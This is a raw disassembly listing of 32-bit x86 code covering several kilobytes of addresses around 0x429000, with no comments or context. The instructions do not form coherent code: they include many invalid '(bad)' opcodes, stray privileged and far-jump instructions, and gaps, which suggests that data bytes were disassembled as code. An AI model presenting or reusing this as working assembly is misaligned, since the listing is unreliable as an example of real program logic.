  42905a:	adc    bl,BYTE PTR [eax-0x1f]
  42905d:	inc    eax
  42905e:	xor    al,0x81
  429060:	pop    edx
  429061:	int    0x8b
  429063:	outs   dx,DWORD PTR ds:[esi]
  429064:	pushf  
  429065:	xchg   edi,eax
  429066:	sbb    al,0xf9
  429068:	mov    bl,BYTE PTR ds:0xc0f1eeef
  42906e:	fdiv   QWORD PTR [esp+eiz*2+0xc71a7b9]
  429075:	mov    BYTE PTR [edx],al
  429077:	push   esi
  429078:	mov    eax,ds:0x7f94e107
  42907d:	sub    eax,0xdb7af56e
  429082:	pop    ss
  429083:	ds add eax,0x430af17a
  429089:	pushf  
  42908a:	add    eax,0xfc51424a
  42908f:	ins    DWORD PTR es:[edi],dx
  429090:	push   ebp
  429091:	retf   0xa049
  429094:	jmp    0x924a66cf
  429099:	imul   edi,DWORD PTR [eax+0x7d],0xf
  42909d:	jle    0x4290ad
  42909f:	dec    edx
  4290a0:	test   BYTE PTR [ebp+edi*2+0x58],ch
  4290a4:	adc    DWORD PTR [edx],edi
  4290a6:	(bad)  
  4290a7:	push   ecx
  4290a8:	cmp    ebp,ebp
  4290aa:	ret    0x5218
  4290ad:	inc    edx
  4290ae:	push   0x40d708f9
  4290b3:	push   cs
  4290b4:	inc    ebx
  4290b5:	stos   DWORD PTR es:[edi],eax
  4290b6:	sub    BYTE PTR [eax-0x71],al
  4290b9:	xchg   esp,eax
  4290ba:	xor    eax,DWORD PTR [edi-0x23]
  4290bd:	mov    dh,0xef
  4290bf:	fbld   TBYTE PTR [eax-0x5]
  4290c2:	pusha  
  4290c3:	fwait
  4290c4:	xor    DWORD PTR [eax],ebx
  4290c6:	sub    dl,bl
  4290c8:	mov    ebx,DWORD PTR [ebx+0x3981bd2]
  4290ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4290cf:	sbb    al,0x47
  4290d1:	jbe    0x429074
  4290d3:	(bad)  
  4290d4:	mov    eax,0x80376767
  4290d9:	or     bl,ah
  4290db:	or     DWORD PTR [edi-0x491fa5f],esi
  4290e1:	sbb    al,0x96
  4290e3:	test   DWORD PTR [edi+ecx*1],ebp
  4290e6:	(bad)  
  4290e7:	pop    eax
  4290e8:	xchg   ecx,eax
  4290e9:	in     al,dx
  4290ea:	xchg   esi,eax
  4290eb:	cmp    eax,0xaecbe555
  4290f0:	inc    eax
  4290f1:	xchg   ebx,eax
  4290f2:	inc    esp
  4290f3:	mov    edi,0xeb185611
  4290f8:	retf   
  4290f9:	jecxz  0x4290f4
  4290fb:	mov    ecx,0xa3716129
  429100:	pop    esp
  429101:	mov    dh,0x65
  429103:	inc    ebp
  429104:	pop    esp
  429105:	cmp    BYTE PTR [ebx+0x52],dh
  429108:	mov    bh,0xaf
  42910a:	cli    
  42910b:	push   ebx
  42910c:	mov    ds:0xaf8006d7,al
  429111:	or     bh,ch
  429113:	jb     0x429176
  429115:	(bad)  
  429116:	inc    BYTE PTR [ebx-0x5b6c71df]
  42911c:	stos   DWORD PTR es:[di],eax
  42911e:	add    BYTE PTR [eax+0x220b125d],dl
  429124:	push   es
  429125:	jb     0x429121
  429127:	mov    bl,0x68
  429129:	in     eax,0x81
  42912b:	test   cl,ah
  42912d:	je     0x429147
  42912f:	(bad)  
  429130:	push   ss
  429131:	fsub   DWORD PTR [eax+0xc734]
	...
  429193:	add    BYTE PTR [eax],al
  429195:	add    BYTE PTR [esi-0x79],dl
  429198:	std    
  429199:	test   ch,bh
  42919b:	(bad)  
  42919c:	jg     0x429175
  42919e:	xor    dh,0xd6
  4291a1:	stos   DWORD PTR es:[edi],eax
  4291a2:	dec    eax
  4291a3:	or     ebp,ebp
  4291a5:	(bad)  
  4291a6:	sbb    esi,DWORD PTR [edi+0x1070001]
  4291ac:	add    BYTE PTR [eax],al
  4291ae:	out    0xfa,eax
  4291b0:	and    al,BYTE PTR [edx]
  4291b2:	or     BYTE PTR [ebx-0x5],ch
  4291b5:	imul   esp,DWORD PTR [edx-0x508c747c],0xffffffb3
  4291bc:	dec    ebp
  4291bd:	add    bl,BYTE PTR [edx-0x4e]
  4291c0:	cli    
  4291c1:	sub    ch,BYTE PTR [ebx-0x34]
  4291c4:	pop    ebp
  4291c5:	push   DWORD PTR [eax+eiz*1]
  4291c8:	cld    
  4291c9:	sbb    bh,0xb
  4291cc:	pop    eax
  4291cd:	mov    cl,BYTE PTR [edx-0x5e]
  4291d0:	inc    ebp
  4291d1:	(bad)  
  4291d2:	mov    fs,WORD PTR ss:[edx+ebx*1]
  4291d6:	add    cl,BYTE PTR [eax]
  4291d8:	out    dx,al
  4291d9:	bound  esp,QWORD PTR [ebx+ecx*2+0x33980e35]
  4291e0:	pop    eax
  4291e1:	je     0x4291de
  4291e3:	ss xchg ecx,eax
  4291e5:	ds ins DWORD PTR es:[edi],dx
  4291e7:	ss jne 0x429211
  4291ea:	push   ebp
  4291eb:	arpl   WORD PTR [edx],bx
  4291ed:	mov    ch,0xd1
  4291ef:	aas    
  4291f0:	das    
  4291f1:	ffreep st(3)
  4291f3:	sub    eax,0x58885dd1
  4291f8:	xlat   BYTE PTR ds:[ebx]
  4291f9:	mov    ebx,0xd81aa36a
  4291fe:	cmp    ebx,DWORD PTR [edx+edi*4]
  429201:	inc    eax
  429202:	test   bh,dh
  429204:	mov    al,ds:0xe260969
  429209:	adc    ch,ah
  42920b:	push   edx
  42920c:	(bad)  
  42920d:	out    dx,al
  42920e:	adc    DWORD PTR [ecx+0x48b95855],ebx
  429214:	mov    ah,0x8a
  429216:	xchg   DWORD PTR [ebx+edi*8-0x4a09cb43],ebp
  42921d:	in     al,dx
  42921e:	adc    ecx,DWORD PTR [eax-0x4c]
  429221:	mov    DWORD PTR [esi-0x40c40651],ebp
  429227:	pop    ebx
  429228:	retf   0x268b
  42922b:	cmp    eax,0x5d0901
  429230:	pop    ebx
  429231:	jo     0x4291fb
  429233:	fsubr  QWORD PTR [edi+0x3db6ef08]
  429239:	(bad)  
  42923a:	xchg   ecx,eax
  42923b:	sbb    ecx,ecx
  42923d:	inc    esp
  42923e:	(bad)  
  42923f:	jbe    0x42928a
  429241:	mov    ch,0xf8
  429243:	dec    ebp
  429244:	stc    
  429245:	xor    eax,0x8fcb83ad
  42924a:	fldenv [ebx-0x7bb63c84]
  429250:	adc    BYTE PTR [edi+eiz*8-0x6136927d],al
  429257:	jecxz  0x429235
  429259:	and    BYTE PTR [ebp-0x3f],cl
  42925c:	xchg   BYTE PTR [ebx],al
  42925e:	pop    ss
  42925f:	jle    0x4292c0
  429261:	cmp    al,BYTE PTR [ebx-0x69ab405a]
  429267:	mov    al,ds:0x9b22afa9
  42926c:	cmc    
  42926d:	iret   
  42926e:	retf   0x72b
  429271:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429272:	mov    dh,0x52
  429274:	add    edx,DWORD PTR [ebp*4-0x63a80518]
  42927b:	inc    edx
  42927c:	ins    DWORD PTR es:[edi],dx
  42927d:	retf   0x209e
  429280:	es std 
  429282:	mov    edx,0xa3c34376
  429287:	ror    DWORD PTR [edx+0x6b692701],cl
  42928d:	ror    BYTE PTR [esp+eiz*4+0xf],1
  429291:	adc    DWORD PTR [esi-0x4a1441de],eax
  429297:	fbld   TBYTE PTR [eax-0x7cdfc237]
  42929d:	and    dh,BYTE PTR [edi-0x23daa497]
  4292a3:	or     al,0xed
  4292a5:	test   esi,esi
  4292a7:	pop    esp
  4292a8:	jle    0x42922c
  4292aa:	mov    bl,0x58
  4292ac:	adc    eax,DWORD PTR [eax+0x56d1a144]
  4292b2:	push   ecx
  4292b3:	dec    edx
  4292b4:	add    BYTE PTR cs:[eax],al
	...
  429313:	add    BYTE PTR [eax],al
  429315:	add    al,dh
  429317:	adc    al,0xe1
  429319:	(bad)  
  42931a:	in     eax,0xff
  42931c:	call   FWORD PTR [esi]
  42931e:	xor    cl,BYTE PTR [ebx-0xc]
  429321:	fs dec ecx
  429323:	mov    cl,0x0
  429325:	call   0x107:0x1b822
  42932c:	add    BYTE PTR [eax],al
  42932e:	push   ebp
  42932f:	popf   
  429330:	lods   al,BYTE PTR ds:[esi]
  429331:	ins    DWORD PTR es:[edi],dx
  429332:	std    
  429333:	outs   dx,BYTE PTR ds:[esi]
  429334:	jge    0x4292bb
  429336:	add    DWORD PTR [eax-0x2a],edx
  429339:	out    0xa3,al
  42933b:	push   ss
  42933c:	(bad)  [edx+ebx*2+0x18]
  429340:	and    al,cl
  429342:	aam    0x69
  429344:	scas   eax,DWORD PTR es:[edi]
  429345:	retf   
  429346:	rcr    DWORD PTR [esi+0x5cdf7d87],cl
  42934c:	shr    bl,cl
  42934e:	cmp    DWORD PTR [ebp+0x663305b4],eax
  429354:	jl     0x429368
  429356:	xchg   BYTE PTR [ecx],bl
  429358:	stc    
  429359:	shl    DWORD PTR [edi+0x281d4c1b],cl
  42935f:	xchg   eax,ebx
  429361:	or     esp,edi
  429363:	mov    BYTE PTR ds:0x613623e1,cl
  429369:	pop    esi
  42936a:	(bad)
  42936f:	mov    al,ds:0x7d7dc3fd
  429374:	jmp    0x810f:0xff020a0a
  42937b:	pop    eax
  42937c:	and    al,BYTE PTR [esi-0x6d4da6fd]
  429382:	adc    DWORD PTR [esi+0x25bf1841],esi
  429388:	sub    BYTE PTR [ecx+0x1c],dh
  42938b:	popa   
  42938c:	pop    ecx
  42938d:	fld    QWORD PTR gs:[edi+0x46]
  429391:	jge    0x4293cb
  429393:	or     BYTE PTR [edi-0x7e62a271],dh
  429399:	and    al,ah
  42939b:	xchg   ebp,eax
  42939c:	out    0x46,eax
  42939e:	int    0x22
  4293a0:	or     eax,0x9819fdf6
  4293a5:	adc    DWORD PTR [ebx-0x2e],eax
  4293a8:	out    dx,eax
  4293a9:	inc    edx
  4293aa:	test   DWORD PTR [edx+0x47],esi
  4293ad:	pushf  
  4293ae:	lahf   
  4293af:	gs imul esp,ebp,0x23
  4293b3:	lahf   
  4293b4:	push   esi
  4293b5:	pop    eax
  4293b6:	sbb    al,0x22
  4293b8:	sar    BYTE PTR [edx+0x78],1
  4293bb:	sbb    BYTE PTR [edi-0x6d],0xd0
  4293bf:	push   0xffffffeb
  4293c1:	push   0x7a95fdef
  4293c6:	cmp    eax,0x1ad195b7
  4293cb:	inc    esi
  4293cc:	jo     0x429432
  4293ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4293cf:	and    dh,BYTE PTR [edi+0x2c]
  4293d2:	dec    ecx
  4293d3:	adc    DWORD PTR [edi],0x931c8256
  4293d9:	or     eax,edx
  4293db:	dec    BYTE PTR [ecx+esi*2-0x5d]
  4293df:	call   0x2d15:0xeb41a654
  4293e6:	mov    ah,0x72
  4293e8:	xchg   esi,eax
  4293e9:	gs lock cld 
  4293ec:	push   esp
  4293ed:	push   ebp
  4293ee:	push   es
  4293ef:	jge    0x429464
  4293f1:	mov    esi,0xc0930873
  4293f6:	sbb    ah,ah
  4293f8:	jmp    0x4293c2
  4293fa:	je     0x429398
  4293fc:	lahf   
  4293fd:	or     eax,0xb974ed81
  429402:	mov    ebx,0x7f130418
  429407:	ret    
  429408:	dec    edi
  429409:	es cmc 
  42940b:	and    DWORD PTR [edi+ebx*1-0x18],ebx
  42940f:	pop    ecx
  429410:	pushf  
  429411:	or     eax,0xd295bfbf
  429416:	mov    cl,0x88
  429418:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429419:	xor    edx,ebx
  42941b:	mov    dl,0xcc
  42941d:	add    al,0x66
  42941f:	push   ebp
  429420:	shl    DWORD PTR [ebx+eiz*8+0x65],1
  429424:	div    DWORD PTR [esi]
  429426:	and    al,0xcf
  429428:	mov    ebx,0x26e78dc1
  42942d:	in     al,0x21
  42942f:	cmp    esi,DWORD PTR [edx+0x21]
  429432:	retf   
  429433:	ret    0x59
	...
  429496:	dec    esp
  429497:	or     eax,0x3e532c13
  42949c:	jg     0x42950b
  42949e:	adc    al,0xa9
  4294a0:	outs   dx,DWORD PTR ds:[esi]
  4294a1:	xlat   BYTE PTR ds:[ebx]
  4294a2:	dec    ebx
  4294a3:	mov    dh,0x90
  4294a5:	shr    BYTE PTR [ecx],cl
  4294a7:	mov    ecx,0x1070001
  4294ac:	add    BYTE PTR [eax],al
  4294ae:	fwait
  4294af:	cld    
  4294b0:	mov    dh,BYTE PTR [ecx+0x38a9d780]
  4294b6:	or     al,BYTE PTR [ebp+ebp*2-0x55fdbfa3]
  4294bd:	xor    al,0x84
  4294bf:	mov    cl,0xb1
  4294c1:	ja     0x42953d
  4294c3:	or     edx,DWORD PTR [edx]
  4294c5:	sub    eax,0xd865b1b3
  4294ca:	mov    ?,WORD PTR [ebx+0x6f]
  4294cd:	repz fistp QWORD PTR [edi+ebp*8+0x7083344e]
  4294d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4294d6:	aad    0x87
  4294d8:	dec    ebx
  4294d9:	xchg   edi,eax
  4294da:	dec    ecx
  4294db:	mov    ds:0x535cb0e0,al
  4294e0:	out    0x2a,eax
  4294e2:	ret    0x10fe
  4294e5:	and    DWORD PTR [edx+0x5bb6b7e],esi
  4294eb:	test   ch,al
  4294ed:	test   BYTE PTR [esi+esi*1+0x173d0c45],bl
  4294f4:	icebp  
  4294f5:	mov    dl,0x45
  4294f7:	jo     0x4294bd
  4294f9:	adc    DWORD PTR [ecx+ecx*2],edx
  4294fc:	dec    ebx
  4294fd:	aaa    
  4294fe:	jle    0x429568
  429500:	sar    ah,cl
  429502:	cmp    ecx,0x59
  429505:	outs   dx,DWORD PTR ds:[esi]
  429506:	push   ss
  429507:	test   eax,0xbf792493
  42950c:	mov    edx,0xecb86b9f
  429511:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429512:	retf   
  429513:	popa   
  429514:	jae    0x429586
  429516:	mov    ebx,0x8e3735c4
  42951b:	fild   WORD PTR cs:[edx+0x5f]
  42951f:	mov    eax,ds:0x4eaaa360
  429524:	mov    bh,0x68
  429526:	imul   esp,eax,0x45533a43
  42952c:	je     0x429589
  42952e:	aas    
  42952f:	cmp    DWORD PTR [ecx+0x2c],ebp
  429532:	test   eax,0x139a1a85
  429537:	scas   eax,DWORD PTR es:[edi]
  429538:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  42953a:	jno    0x429585
  42953c:	jge    0x4294ef
  42953e:	push   esp
  42953f:	repz cs mov ebx,0x11674e67
  429546:	jae    0x42950c
  429548:	dec    DWORD PTR [edi-0x4c]
  42954b:	out    0xbf,eax
  42954d:	xchg   cl,al
  42954f:	or     ah,ch
  429551:	ds retf 
  429553:	inc    ebx
  429554:	int    0x8e
  429556:	inc    ebx
  429557:	dec    esp
  429558:	pop    ecx
  429559:	or     al,0x6a
  42955b:	jb     0x429526
  42955d:	sbb    DWORD PTR [esi-0x16],0x4e
  429561:	ficom  WORD PTR [esi+0x26c46a07]
  429567:	paddsb mm5,mm2
  42956a:	push   ds
  42956b:	add    bl,BYTE PTR [edx-0x50]
  42956e:	push   0xffffff94
  429570:	fld    TBYTE PTR [esi-0x73e815be]
  429576:	fnstcw WORD PTR [ebx+0x26c5cc75]
  42957c:	sbb    esi,DWORD PTR [ebp+0x9]
  42957f:	adc    edx,DWORD PTR [ecx-0x3]
  429582:	adc    al,BYTE PTR [ebp+eax*1-0x5a7b9657]
  429589:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42958a:	js     0x42956f
  42958c:	xchg   edx,eax
  42958d:	jmp    0x4a7c57f9
  429592:	jne    0x429604
  429594:	xchg   DWORD PTR [eax+esi*4+0x5d],ecx
  429598:	fs dec ebx
  42959a:	add    DWORD PTR [esi+0x7d],0x19
  42959e:	jns    0x42952d
  4295a0:	mov    edx,0xa67d9352
  4295a5:	lahf   
  4295a6:	push   ebx
  4295a7:	mov    esp,0xb52e68b6
  4295ac:	in     eax,dx
  4295ad:	sbb    ecx,eax
  4295af:	(bad)  
  4295b0:	xchg   edx,eax
  4295b1:	mov    esp,0x331418
	...
  429616:	ins    DWORD PTR es:[edi],dx
  429617:	sbb    eax,0xfbf6c0e6
  42961c:	outs   dx,DWORD PTR ds:[esi]
  42961d:	mov    ebp,0x8523ba9d
  429622:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429623:	ret    0xfe77
  429626:	xor    BYTE PTR [edx+0x1070001],bh
  42962c:	add    BYTE PTR [eax],al
  42962e:	jae    0x4295c2
  429630:	pop    edi
  429631:	into   
  429632:	lods   eax,DWORD PTR ds:[esi]
  429633:	cli    
  429634:	int    0xb0
  429636:	out    0x5d,eax
  429638:	push   edi
  429639:	pop    ds
  42963a:	ja     0x429675
  42963c:	pop    esi
  42963d:	mov    al,dl
  42963f:	popf   
  429640:	out    0xc4,al
  429642:	and    BYTE PTR [eax+eax*1],cl
  429645:	push   esi
  429646:	add    ah,dh
  429648:	retf   
  429649:	or     edx,DWORD PTR [edi+0x58]
  42964c:	xchg   edx,eax
  42964d:	int3   
  42964e:	xchg   ecx,eax
  42964f:	mov    eax,ds:0x607e4a3b
  429654:	(bad)  
  429655:	mov    ecx,0x59ddf0b8
  42965a:	mov    edx,0x6195a17
  42965f:	lds    edx,FWORD PTR [ebx-0x6c]
  429662:	inc    edx
  429663:	inc    ebx
  429664:	stos   BYTE PTR es:[edi],al
  429665:	mov    edx,DWORD PTR [ebp+0x4c87e99b]
  42966b:	mov    es,ebx
  42966d:	mov    ch,0xb8
  42966f:	and    ebx,DWORD PTR [ebx]
  429671:	sub    esp,DWORD PTR [ecx+eiz*1]
  429674:	js     0x42969c
  429676:	jo     0x42960d
  429678:	fst    QWORD PTR [ebp-0xb]
  42967b:	(bad)  
  42967c:	or     BYTE PTR [edx],ah
  42967e:	in     al,dx
  42967f:	and    DWORD PTR [edx],ebp
  429681:	adc    BYTE PTR [eax-0x10ed5e8f],bh
  429687:	cmp    ah,dh
  429689:	inc    esi
  42968a:	add    dl,al
  42968c:	mov    esp,0xd2c402dd
  429691:	fidiv  DWORD PTR [eax]
  429693:	pop    ss
  429694:	imul   ebx,edx,0x878206bc
  42969a:	test   al,0x12
  42969c:	xor    esi,eax
  42969e:	fldenv [edx-0x6baaec52]
  4296a4:	xor    al,0xea
  4296a6:	push   cs
  4296a7:	iret   
  4296a8:	pop    ecx
  4296a9:	je     0x4296d6
  4296ab:	xchg   edx,eax
  4296ac:	lods   al,BYTE PTR ds:[esi]
  4296ad:	mov    esi,0xe86718c1
  4296b2:	ret    
  4296b3:	mov    ecx,0x1252731
  4296b8:	add    bl,ah
  4296ba:	pop    esp
  4296bb:	and    BYTE PTR [ebp-0x5de0b12f],dl
  4296c1:	jmp    0x4fbe:0xc12070e3
  4296c8:	and    eax,DWORD PTR [eax+0x291d8863]
  4296ce:	xlat   BYTE PTR es:[ebx]
  4296d0:	ror    DWORD PTR ds:0xdc9bfc7e,1
  4296d6:	jo     0x429710
  4296d8:	jp     0x4296c3
  4296da:	cld    
  4296db:	cli    
  4296dc:	mov    bl,0xd0
  4296de:	cdq    
  4296df:	loopne 0x4296de
  4296e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4296e2:	out    0xa8,eax
  4296e4:	iret   
  4296e5:	mov    cl,0x4
  4296e7:	loop   0x429735
  4296e9:	stc    
  4296ea:	pop    ds
  4296eb:	fnstcw WORD PTR [ecx]
  4296ed:	ret    
  4296ee:	sbb    eax,0xc8197067
  4296f3:	int    0x27
  4296f5:	rcl    bl,0xc0
  4296f8:	mov    eax,0x9fa124e8
  4296fd:	pop    edx
  4296fe:	(bad)  
  4296ff:	lods   al,BYTE PTR ds:[esi]
  429700:	add    DWORD PTR [edx+ebx*8-0xb],0x52
  429705:	nop
  429706:	cli    
  429707:	mov    ebx,0xd838b50
  42970c:	mov    cl,0xc5
  42970e:	sbb    BYTE PTR [eax+ebp*2-0x1b],bh
  429712:	push   edx
  429714:	data16 (bad) 
  429716:	xchg   esp,eax
  429717:	xor    eax,0x70ffbc98
  42971c:	retf   
  42971d:	arpl   sp,bp
  42971f:	and    DWORD PTR [ebx-0x1c91047e],edx
  429725:	das    
  429726:	mov    WORD PTR ds:0xd207b0e4,fs
  42972c:	xor    ebx,ebp
  42972e:	clc    
  42972f:	dec    edi
  429730:	ret    0x72b5
  429733:	mov    edi,0xea
	...
  429794:	add    BYTE PTR [eax],al
  429796:	xor    BYTE PTR [edx-0x21],al
  429799:	(bad)  
  42979a:	(bad)  
  42979b:	(bad)  
  42979c:	mov    ebp,0x1396252
  4297a1:	xsaveopt [ebp-0x44c823b6]
  4297a8:	add    DWORD PTR [eax],eax
  4297aa:	pop    es
  4297ab:	add    DWORD PTR [eax],eax
  4297ad:	add    BYTE PTR [edi+0x5ce60d5e],bl
  4297b3:	mov    edi,0xf400c5a8
  4297b8:	aad    0x64
  4297ba:	push   ebp
  4297bb:	mov    esp,0xfdedf14c
  4297c0:	mov    BYTE PTR [esp+edi*4-0xa],ch
  4297c4:	outs   dx,BYTE PTR ds:[esi]
  4297c5:	ret    0xa4af
  4297c8:	cmp    al,0x5f
  4297ca:	out    dx,al
  4297cb:	xchg   ebp,eax
  4297cc:	mov    ds:0x507151ed,eax
  4297d1:	test   ah,dl
  4297d3:	jmp    0x429840
  4297d5:	sbb    DWORD PTR [edx+eax*2-0x79],eax
  4297d9:	pop    es
  4297da:	aad    0xf4
  4297dc:	adc    eax,0xf9995218
  4297e1:	in     al,0xbb
  4297e3:	aam    0xba
  4297e5:	jle    0x42982b
  4297e7:	adc    BYTE PTR [ecx-0x5d],ch
  4297ea:	xsaves [ebp-0x250569e8]
  4297f1:	mov    gs,WORD PTR ds:0xda15c510
  4297f7:	jle    0x42984e
  4297f9:	jmp    0x74eeb29e
  4297fe:	push   0xffffffd2
  429800:	or     al,bh
  429802:	mov    al,ds:0x7d8d0140
  429807:	pop    edi
  429808:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429809:	and    al,0x2b
  42980b:	mov    cs,WORD PTR [edx]
  42980d:	aam    0x25
  42980f:	cmp    ebx,edx
  429811:	push   ss
  429812:	sub    eax,ebp
  429814:	addr16 shl ch,cl
  429817:	in     al,dx
  429818:	and    ch,BYTE PTR [eax-0x7c]
  42981b:	adc    bl,BYTE PTR [edi]
  42981d:	ds sbb ebp,eax
  429820:	mov    edi,0x63565ac5
  429825:	mov    ?,WORD PTR [ebx]
  429827:	sub    DWORD PTR ds:0x17c1266b,ecx
  42982d:	xchg   BYTE PTR [eax-0x4a4d8fb1],al
  429833:	fbld   TBYTE PTR [ebx+ebx*1-0x62]
  429837:	retf   0xe342
  42983a:	rcl    BYTE PTR [edx+ebp*4-0x7010ce94],0x4b
  429842:	jnp    0x429862
  429844:	sbb    esp,DWORD PTR [ebp+0x11]
  429847:	jnp    0x4297e2
  429849:	add    al,BYTE PTR [eax]
  42984b:	xchg   esi,eax
  42984c:	push   es
  42984d:	sbb    dl,BYTE PTR [ebx]
  42984f:	jbe    0x4298b6
  429851:	or     bh,cl
  429853:	arpl   WORD PTR [edx],bx
  429855:	rol    BYTE PTR [esi+esi*1-0x68],1
  429859:	mov    bl,0xb9
  42985b:	push   ss
  42985c:	call   0xc868ffad
  429861:	pop    dx
  429863:	inc    ebx
  429864:	sub    BYTE PTR [ecx+0x65e4f7f7],0x75
  42986b:	mov    edx,0x3f4ed731
  429870:	sahf   
  429871:	jl     0x429831
  429873:	adc    ah,dh
  429875:	dec    esp
  429876:	imul   ebp,DWORD PTR [edx],0x2f0e0aeb
  42987c:	in     al,dx
  42987d:	xchg   edi,eax
  42987e:	cmp    dh,dh
  429880:	mov    bl,BYTE PTR [eax*4-0xc3eeae9]
  429887:	cmpxchg8b (bad)
  429888:	(bad)  
  429889:	iret   
  42988a:	sahf   
  42988b:	cdq    
  42988c:	dec    ebx
  42988d:	retf   0x98a0
  429890:	xor    ebp,ecx
  429892:	and    eax,0xbf90cb00
  429897:	sub    DWORD PTR [ebp+0x7b0a514],edx
  42989d:	das    
  42989e:	ins    DWORD PTR es:[edi],dx
  42989f:	sbb    dh,BYTE PTR [edx]
  4298a1:	xchg   esp,eax
  4298a2:	loopne 0x4298ee
  4298a4:	aam    0x39
  4298a6:	mov    ebp,0x29b90248
  4298ab:	fmul   DWORD PTR [ecx]
  4298ad:	mov    ds:0xe1856534,eax
  4298b2:	loopne 0x42985a
  4298b4:	stc    
	...
  429915:	add    BYTE PTR [edi+0x68],dl
  429918:	fistp  QWORD PTR fs:[edi-0x21]
  42991c:	(bad)  
  42991d:	call   0x449747d3
  429922:	push   eax
  429923:	mov    ecx,0xbc3e39e8
  429928:	add    DWORD PTR [eax],eax
  42992a:	pop    es
  42992b:	add    DWORD PTR [eax],eax
  42992d:	add    BYTE PTR [edx-0x31],ah
  429930:	sahf   
  429931:	push   0xeb77a671
  429936:	fstp   QWORD PTR [esi+0x79]
  429939:	dec    ebx
  42993a:	es loope 0x4299b8
  42993d:	imul   edx,ebx,0xdf37955b
  429943:	xchg   esp,eax
  429944:	xor    eax,DWORD PTR [ecx+ebx*2+0x2bfa29fc]
  42994b:	cmp    ebx,DWORD PTR [ebp-0x54477c85]
  429951:	and    bh,BYTE PTR [ecx-0x2f]
  429954:	scas   al,BYTE PTR es:[edi]
  429955:	in     eax,dx
  429956:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429957:	cmp    ebp,DWORD PTR [edi]
  429959:	dec    esi
  42995a:	mov    al,ds:0xd65ec1c0
  42995f:	out    dx,al
  429960:	loopne 0x42998f
  429962:	and    esi,DWORD PTR [edx+edi*1]
  429965:	dec    ecx
  429966:	jg     0x429980
  429968:	aas    
  429969:	icebp  
  42996a:	push   ds
  42996b:	test   dl,0x5b
  42996e:	aaa    
  42996f:	pop    edi
  429970:	jb     0x429982
  429972:	cmp    edx,edi
  429974:	loope  0x42993b
  429976:	mov    dh,dh
  429978:	cmc    
  429979:	and    cl,BYTE PTR [ebp-0x6e056ac3]
  42997f:	push   es
  429980:	mov    al,0x42
  429982:	sbb    ch,dl
  429984:	add    DWORD PTR [ecx],0xffffff81
  429987:	ins    BYTE PTR es:[edi],dx
  429988:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429989:	push   ecx
  42998a:	fst    QWORD PTR [ebp-0x43abb805]
  429990:	adc    bl,BYTE PTR [ecx-0x6679d43e]
  429996:	jge    0x429972
  429998:	pop    eax
  429999:	addr16 dec ebp
  42999b:	dec    edi
  42999c:	push   esi
  42999d:	push   es
  42999e:	lea    esi,[ebx+edi*8]
  4299a1:	aaa    
  4299a2:	mov    edx,0xa11c7c6f
  4299a7:	loopne 0x4299e7
  4299a9:	jg     0x429979
  4299ab:	lods   eax,DWORD PTR ds:[esi]
  4299ac:	mov    ch,0xa7
  4299ae:	sbb    DWORD PTR [edx],ebx
  4299b0:	rol    BYTE PTR [eax-0x30214b58],0x36
  4299b7:	jae    0x4299b0
  4299b9:	lods   al,BYTE PTR ds:[esi]
  4299ba:	fst    QWORD PTR [ecx]
  4299bc:	mov    dl,0xd2
  4299be:	out    0x5c,eax
  4299c0:	(bad)  
  4299c1:	fs pop edx
  4299c3:	pop    esp
  4299c4:	sar    BYTE PTR [edi-0x77],1
  4299c7:	lea    esi,[ebp+edi*2+0x513b311e]
  4299ce:	addr16 pop ecx
  4299d0:	lods   al,BYTE PTR ds:[esi]
  4299d1:	and    eax,0xee0d50f8
  4299d6:	mov    esi,0x656e535c
  4299db:	push   esi
  4299dc:	ret    0x19fe
  4299df:	stos   DWORD PTR es:[edi],eax
  4299e0:	jge    0x42997a
  4299e2:	imul   ebp,ebp,0x138874f7
  4299e8:	repnz mov ds:0x531cec45,al
  4299ee:	inc    esp
  4299ef:	in     eax,0xa0
  4299f1:	das    
  4299f2:	push   edi
  4299f3:	add    DWORD PTR [ebp+0x41],ebp
  4299f6:	adc    al,0x2f
  4299f8:	cli    
  4299f9:	mov    eax,DWORD PTR [ebp+edx*8-0x5e10c1fc]
  429a00:	push   cs
  429a01:	add    edi,esi
  429a03:	mov    ch,0x41
  429a05:	xor    ah,BYTE PTR [ebx+0x1fcea745]
  429a0b:	jb     0x429a65
  429a0d:	lods   al,BYTE PTR ds:[esi]
  429a0e:	adc    bh,BYTE PTR [esi]
  429a10:	stc    
  429a11:	repz sahf 
  429a13:	out    0x99,eax
  429a15:	or     dl,dl
  429a17:	lods   al,BYTE PTR ds:[esi]
  429a18:	xchg   ebp,eax
  429a19:	and    DWORD PTR [eax-0x2c65452],0xd715ecae
  429a23:	mov    esi,0xd63d4be8
  429a28:	clc    
  429a29:	pusha  
  429a2a:	mov    esi,0x502d7f53
  429a2f:	mov    ecx,DWORD PTR [eax-0x5646ff90]
	...
  429a95:	add    dh,cl
  429a97:	std    
  429a98:	sti    
  429a99:	leave  
  429a9a:	sti    
  429a9b:	iret   
  429a9c:	(bad)  
  429a9d:	jmp    DWORD PTR [ecx]
  429a9f:	dec    eax
  429aa0:	mov    edi,0xf530e13
  429aa5:	cmp    DWORD PTR [ebp-0x43],eax
  429aa8:	add    DWORD PTR [eax],eax
  429aaa:	pop    es
  429aab:	add    DWORD PTR [eax],eax
  429aad:	add    BYTE PTR [edi-0x7785fd50],cl
  429ab3:	popa   
  429ab4:	daa    
  429ab5:	and    ebp,0x5d
  429ab8:	into   
  429ab9:	add    dh,BYTE PTR [ebp+0x6609211]
  429abf:	dec    edi
  429ac0:	jb     0x429aa1
  429ac2:	push   0x7b39bdae
  429ac7:	mov    esp,0xfb0aee25
  429acc:	dec    ecx
  429acd:	add    dh,BYTE PTR [esi]
  429acf:	push   cs
  429ad0:	cmp    bl,bh
  429ad2:	cmp    ah,BYTE PTR [esi]
  429ad4:	push   0xffffff89
  429ad6:	mov    al,ds:0xc7464da
